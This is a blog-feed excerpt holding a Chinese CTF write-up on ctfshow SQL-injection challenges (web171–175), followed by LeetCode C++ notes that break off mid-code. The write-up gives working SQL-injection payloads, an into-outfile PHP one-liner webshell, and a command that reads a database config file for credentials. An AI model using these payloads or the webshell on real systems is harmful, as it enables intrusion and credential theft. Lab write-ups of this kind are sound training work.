        <content type="html"><![CDATA[<h1>CTF show Sql注入</h1><p>做此类题之前最好在本地环境下进行sql语句测试，确保本地打通后再测试远程，这样可提高对于sql语句的掌握程度</p><h2 id="web171">web171</h2><h3 id="题目描述">题目描述</h3><p><strong>从此题开始的150道题全部为sql注入，准备好了吗？</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>拼接<span class="keyword">sql</span>语句查找指定ID用户</span><br><span class="line">$<span class="keyword">sql</span> <span class="operator">=</span> &quot;select username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[<span class="string">&#x27;id&#x27;</span>].&quot;&#x27; limit 1;&quot;;</span><br></pre></td></tr></table></figure><p>本题为白盒测试，给出了sql语句，并且再过滤中暗示包含flag的字段<code>username=flag</code>，在本地DataGrip中尝试拼接语句，这里我测试了正常拼接和联合查询,在本地均可正常回显，但打不通远程</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> ;<span class="keyword">select</span> username,password <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;flag&#x27;</span>; #<span class="string">&#x27; limit 1;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">select username,password from user where username !=&#x27;</span>flag<span class="string">&#x27; and id = &#x27;</span><span class="number">1</span><span class="string">&#x27; union select username,password from user where username =&#x27;</span>flag<span class="string">&#x27;; #&#x27;</span> limit <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>这里看其他师傅的WP，学到了已知<code>and</code>优先级高于<code>or</code>，所以先<code>username !='flag' and id='1' </code>再<code>or 1=1</code><br>所以<code>假or真</code>，结果为真，恒为真 所有的内容都会被输出<br>所有的user表中的username，password都被输出了，得到flag的内容.</p><p>payload：<code>1' or 1=1 --+</code></p><p>其他几种可行的payload：<code>9999' or id = '26</code>、<code>1' or username='flag' --+</code></p><blockquote><p>实测这里使用#注释会报错，实际情况中要多尝试</p></blockquote><h2 id="web172">web172</h2><h3 id="题目描述">题目描述</h3><p><strong>撸猫为主，要什么flag?</strong></p><h3 id="解题思路">解题思路</h3><p>此题开放了两个模块，第一个模块用上一个payload继续打，发现<code>flag_not_here</code>,直接进入下一个模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if($row-&gt;username!==&#x27;flag&#x27;)&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>sql语句不变，添加了返回逻辑判断</p><p>我们可以使用联合查询的姿势，将<code>username</code>和<code>password</code>的顺序调换，偷梁换柱以绕过返回过滤</p><p>payload：<code>9999' union select password,username from ctfshow_user2 where username ='flag' --+</code></p><p>sql语句拼接后如下</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,password <span class="keyword">from</span> ctfshow_user2 <span class="keyword">where</span> username <span class="operator">!=</span><span class="string">&#x27;flag&#x27;</span> <span class="keyword">and</span> id <span class="operator">=</span> <span class="string">&#x27;9999&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> password,username <span class="keyword">from</span> ctfshow_user2 <span class="keyword">where</span> username <span class="operator">=</span><span class="string">&#x27;flag&#x27;</span> <span class="comment">--+&#x27; limit 1;</span></span><br></pre></td></tr></table></figure><h2 id="web173">web173</h2><h3 id="题目描述">题目描述</h3><p><strong>考察sql基础</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>加强了返回结果的判断，但换汤不换药，关键的是<code>password</code>中内容，略微修改payload即可</p><p><code>9999' union select id,id,password from ctfshow_user3 where username='flag' --+</code></p><blockquote><p>或许可以用MySQL字符串函数绕过，如to_base64()、hex()</p></blockquote><h2 id="web174">web174</h2><h3 id="题目描述">题目描述</h3><p><strong>考察sql基础，不要一把梭，没意思</strong></p><h3 id="解题思路">解题思路</h3><p>再次加强了过滤，ban掉了数字</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//检查结果是否有flag</span><br><span class="line">    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;</span><br><span class="line">      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这还是挺伤的，由于flag中肯定包含数字，故以上绕过姿势失效</p><p>我们可以搜索<a href="https://www.yzktw.com.cn/post/957917.html">Mysql字符串函数</a>找找有没有什么函数可用，发现<code>replace()</code></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> REPLACE(<span class="string">&#x27;Hello World&#x27;</span>,<span class="string">&#x27;World&#x27;</span>,<span class="string">&#x27;MySQL&#x27;</span>) <span class="keyword">AS</span> <span class="keyword">result</span>;</span><br><span class="line"><span class="comment">-- Output: Hello MySQL</span></span><br></pre></td></tr></table></figure><p>我们可以用其他字符替换数字来正常回显，再写脚本还原即可</p><p><img src="https://s2.loli.net/2023/09/23/Oi4ojFqLQuHlRfb.png" alt="在本地构造sql语句"></p><p>构造后payload：<code>9999'union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','!'),'2','@'),'3','#'),'4','$'),'5','%'),'6','^'),'7','&amp;'),'8','*'),'9','('),'0',')') from ctfshow_user4 --+</code></p><p>尝试打一下一直报接口错误，抓个包看一下。。。</p><p><img src="https://s2.loli.net/2023/09/23/koH2tpVJAmDNTbj.png" alt="抓包"></p><p>破案了应该是payload太长，中间截断了没有完全上传</p><p>更改一下payload：<code>9999'union select 'a',replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,'1','!'),'2','@'),'3','#'),'4','$'),'5','%'),'6','^'),'7','&amp;'),'8','*'),'9','('),'0',')') from ctfshow_user4 where username='flag</code></p><p>全部url编码后BP发包即可得到回显<code>ctfshow&#123;!)d#f$f#-a)$(-$cbe-be@@-b&amp;@b*d&amp;@@$##&#125;</code></p><p>写一个python脚本将<code>flag</code>还原</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">flag = <span class="string">&#x27;ctfshow&#123;!)d#f$f#-a)$(-$cbe-be@@-b&amp;@b*d&amp;@@$##&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = flag.replace(<span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">flag = flag.replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment"># ctfshow&#123;10d3f4f3-a049-4cbe-be22-b72b8d722433&#125;</span></span><br></pre></td></tr></table></figure><h2 id="web175">web175</h2><h3 id="题目描述">题目描述</h3><p><strong>最后一个无过滤注入，到此你已经熟悉了基础的sql语句。</strong></p><h3 id="解题思路">解题思路</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//检查结果是否有flag</span></span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[\x00-\x7f]/i&#x27;</span>, <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>)))&#123;</span><br><span class="line">      <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;查询成功&#x27;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>本来思路和上一题一样，是将结果中的过滤字符替换为中文等字符，但将其转化为json格式中应该必定存在过滤字符，导致无法回显，所以思路为更换其他信道得到结果，如公网带外，文件写入等。本题使用文件写入</p><p><strong>预期解</strong></p><p><code>99' union select 1,password from ctfshow_user5 into outfile '/var/www/html/1.txt' --+</code>访问1.txt即可看到flag，用该方法以上对输出结果进行过滤的题目均可用该种方法绕过过滤</p><p><strong>非预期解</strong></p><p>通过写入一句话木马<br><code>99' union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile '/var/www/html/1.php' --+</code><br>这样可能会引起数据异常，保险起见可以将<code>&lt;?php eval($_POST[1]);?&gt;</code>base64编码后再url编码，再用sql函数<code>from_base64()</code>传入，用bp检查数据是否完整</p><p>传入木马之后可以RCE，可以查看<code>./api/config.php</code>，找到数据库账号和密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1=system(&#x27;tac ./api/config.php&#x27;);</span><br><span class="line"># $charName = &quot;utf-8&quot;; $dbname = &quot;ctfshow_web&quot;; $dbpwd = &quot;root&quot;; $dbuser = &quot;root&quot;; $dbhost =&quot;127.0.0.1&quot;; */ # @link: https://ctfer.com # @email: h1xa@ctfer.com # @Last Modified time: 2020-11-01 19:29:25 # @Last Modified by: h1xa # @Date: 2020-11-01 14:21:14 # @Author: h1xa # -*- coding: utf-8 -*- /*</span><br></pre></td></tr></table></figure><p>用蚁剑连接后，用数据处理查询该表下所有数据即可</p><p><img src="https://s2.loli.net/2023/10/12/IoFEgdtypjMmC7H.png" alt="sql"></p><p><img src="https://s2.loli.net/2023/10/12/Dtegu84sM9XwnKm.png" alt="Sql (2)"></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode刷题笔记</title>
      <link href="/2023/09/17/Leetcode/Week1-10/"/>
      <url>/2023/09/17/Leetcode/Week1-10/</url>
      
        <content type="html"><![CDATA[<blockquote><p>从零开始刷一下leetcode非会员题（尽量使用最优算法）</p></blockquote><h1>Week1</h1><h2 id="1-两数之和"><a href="https://leetcode.cn/problems/two-sum/">1. 两数之和</a></h2><p>暴力枚举可过，时间复杂度<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p>哈希表：思路为遍历数组，判断当前元素前有无元素与其之和等于target，而哈希表查找元素的时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，我们可以每当遍历一个元素而找不到与其之和满足要求的元素时，将其存入哈希表以便后续查找，这样即可将算法总时间复杂度优化到<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><blockquote><p>tips：C++语法中自带两个哈希表数据结构，分别为有序map(底层为红黑树实现)，查找时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mi>n</mi></mrow><annotation encoding="application/x-tex">\log_{2}{n}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.93858em;vertical-align:-0.24414em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">n</span></span></span></span></span>，而无序哈希表unordered_map时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mn>1</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(1)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord">1</span><span class="mclose">)</span></span></span></span>，本题用后者</p></blockquote><p>题解：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">twoSum</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> target)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="type">int</span>&gt; res; <span class="comment">// 存放两数的下标</span></span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; hash; <span class="comment">// 哈希表</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;nums.<span class="built_in">size</span>();i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">int</span> r=target-nums[i];<span class="comment">//计算与当前元素相加为target的值</span></span><br><span class="line">            <span class="keyword">if</span>(hash.<span class="built_in">count</span>(r)) <span class="comment">//若找到目标元素，将两数下标存入</span></span><br><span class="line">            &#123;</span><br><span class="line">                res.<span class="built_in">push_back</span>(hash[r]);</span><br><span class="line">                res.<span class="built_in">push_back</span>(i);</span><br><span class="line">            &#125;</span><br><span class="line">            hash[nums[i]]=i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="2-两数相加"><a href="https://leetcode.cn/problems/add-two-numbers/">2. 两数相加</a></h2><p>示例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">输入：l1 = [2,4,3], l2 = [5,6,4]</span><br><span class="line">输出：[7,0,8]</span><br><span class="line">解释：342 + 465 = 807.</span><br></pre></td></tr></table></figure><p>给出数据以<strong>链表</strong>形式<strong>倒序</strong>存储，从个位依次运算即可（注意细节）</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">addTwoNumbers</span><span class="params">(ListNode* l1, ListNode* l2)</span> </span>&#123;</span><br><span class="line">        ListNode* Newhead=<span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">-1</span>);<span class="comment">//新建存放结果链表的哨兵头节点</span></span><br><span class="line">        ListNode* cur=Newhead;<span class="comment">//记录返回链表当前节点位置</span></span><br><span class="line">        <span class="type">int</span> t=<span class="number">0</span>;<span class="comment">//储存进位</span></span><br><span class="line">        <span class="keyword">while</span>(l1||l2||t)<span class="comment">//当l1、l2没有遍历完或进位不为0时，继续循环</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(l1) <span class="comment">//当l1没遍历完时</span></span><br><span class="line">            &#123;</span><br><span class="line">                t+=l1-&gt;val;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(l2) <span class="comment">//当l2没遍历完时</span></span><br><span class="line">            &#123;</span><br><span class="line">                t+=l2-&gt;val;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">            cur-&gt;next=<span class="keyword">new</span> <span class="built_in">ListNode</span>(t%<span class="number">10</span>);</span><br><span class="line">            t/=<span class="number">10</span>;</span><br><span class="line">            cur=cur-&gt;next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Newhead-&gt;next;<span class="comment">//返回哨兵节点的下一个</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="3-无重复字符的最长子串"><a href="https://leetcode.cn/problems/longest-substring-without-repeating-characters/">3. 无重复字符的最长子串</a></h2><p>初见可能比较难，先了解一下双指针算法和滑动窗口算法</p><p><strong>基本思路</strong>：要找出给定字符串<code>s</code>中不含重复字符的最长子串。基本思路肯定是遍历所有子串，并找出符合条件的。我们以字串尾字符为基准进行遍历，若暴力遍历时间复杂度为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><msup><mi>n</mi><mn>2</mn></msup><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n^2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.064108em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord"><span class="mord mathdefault">n</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141079999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></p><p><strong>优化办法</strong>：假设尾节点为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>时，无重复字符最长子串头节点为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>，当我们遍历尾节点为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">j+1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>的所有子串时，满足条件的头节点<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>i</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup></mrow><annotation encoding="application/x-tex">i&#x27;</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.751892em;vertical-align:0em;"></span><span class="mord"><span class="mord mathdefault">i</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span></span></span></span>仅可能出现在<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>或其右侧，这样使两个指针遍历时“不走回头路”，类似滑动窗口，可将算法时间复杂度优化至<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathdefault">n</span><span class="mclose">)</span></span></span></span></p><p><strong>其他细节</strong>：我们可以用哈希表来维护指针<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>、<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>之间元素出现的个数，便于判断其间有无重复元素，每次<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>指针向前移动一次，将其存入哈希表，若有重复元素则定为<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.65952em;vertical-align:0em;"></span><span class="mord mathdefault">i</span></span></span></span>指向元素值，<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>j</mi></mrow><annotation encoding="application/x-tex">j</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.85396em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.05724em;">j</span></span></span></span>向前移动至该元素仅出现一次即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">char</span>,<span class="type">int</span>&gt; hash;<span class="comment">//哈希表存放i、j间字符出现个数</span></span><br><span class="line">        <span class="type">int</span> i=<span class="number">0</span>;<span class="comment">//左指针</span></span><br><span class="line">        <span class="type">int</span> res=<span class="number">0</span>;<span class="comment">//保存结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;s.<span class="built_in">size</span>();j++)</span><br><span class="line">        &#123;</span><br><span class="line">            hash[s[j]]++;<span class="comment">//对应字符的出现次数加1</span></span><br><span class="line">            <span 